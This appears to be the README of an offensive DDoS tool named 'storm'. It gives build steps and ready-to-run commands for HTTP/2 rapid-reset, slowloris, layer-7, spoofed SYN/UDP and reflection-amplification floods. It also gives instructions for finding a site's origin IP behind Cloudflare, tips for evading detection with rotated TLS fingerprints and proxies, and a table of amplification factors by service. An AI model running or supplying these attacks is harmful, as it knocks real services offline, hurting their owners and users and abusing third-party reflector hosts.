# storm — pressure engine with origin discovery

Bypass hierarchy:
1. Origin discovery (recon) — real bypass. Find the origin IP, Cloudflare is irrelevant.
2. Edge pressure — rapid reset, slowloris, cache-busting L7 on dynamic endpoints.
3. Protocol layer — SYN/UDP raw floods, spoofed-source amplification.

## install

```bash
# python engine (python3.11+, linux)
chmod +x storm.py

# C++ rapid-reset engine
g++ -O2 -pthread storm_h2.cpp -o storm_h2
```

## usage

```bash
# 0) recon first — this is the bypass
sudo python3 storm.py recon --domain target.com

# 1) origin found? hit it directly, all vectors open
sudo python3 storm.py attack --target https://target.com --vectors syn,udp,h2,tls,slow,l7 --duration 300

# 2) origin hidden -> dynamic-endpoint pressure through the edge
python3 storm.py l7 --url https://target.com/login --threads 200 --duration 600
python3 storm.py h2 --host target.com --port 443 --threads 16 --streams 40000
python3 storm.py slow --host target.com --port 443 --conns 3000 --tls

# 3) amplification (spoofed src, root, verified reflectors)
sudo python3 storm.py amp --victim 1.2.3.4 --reflectors reflectors.txt --services ntp,dns,ssdp,wsd,chargen --duration 120

# 4) raw floods straight at the origin ip
sudo python3 storm.py syn --ip 1.2.3.4 --port 443 --threads 64 --spoof
sudo python3 storm.py udp --ip 1.2.3.4 --threads 16 --spoof

# 5) C++ rapid reset, origin ip + real hostname for SNI
./storm_h2 1.2.3.4 443 www.target.com 32 65535 300
```

## operational notes

- Origin hunt is 90% of the fight. crt.sh + SPF include chains + MX hosts + mail/vpn/staging subdomains are where origins leak. probe_origin() drops anything with a cf-ray header.
- L7 through the edge only works on dynamic surface (login/search/checkout/api) — cache-busted query strings + rotated X-Forwarded-For per request.
- Rapid reset burns proxy CPU on stream alloc/dealloc; run against origin IP with SNI = real host.
- Resource facts: slow/h2/tls hold thousands of fds — `ulimit -n 1000000` first. Spoofed raw modes need root (CAP_NET_RAW) and clean egress (no BCP38).
- Amplification needs a verified reflector list. DNS ANY and SSDP are the ones that still work at scale.
- Evasion: rotate TLS fingerprints per worker (curl-impersonate profiles), vary HTTP/2 SETTINGS, spread sources with --proxies (socks5:// or http:// per line).

## amplification factor table

| service | port | vector | amp factor |
|---|---|---|---|
| NTP      | 123   | monlist / peers          | up to ~x200 |
| DNS      | 53    | ANY + EDNS0              | ~x50-100 |
| DNS      | 53    | CH TXT version.bind      | ~x100 |
| Memcached| 11211 | stats                    | ~x1000s (mostly patched) |
| Chargen  | 19    | one char triggers stream | ~x350 |
| SSDP     | 1900  | M-SEARCH all             | ~x30 |
| WS-Discovery | 3702 | SOAP Probe            | ~x5-10 |
| SNMPv2   | 161   | GetBulk public           | ~x10 |
| CLDAP    | 389   | empty SearchRequest      | ~x70 |
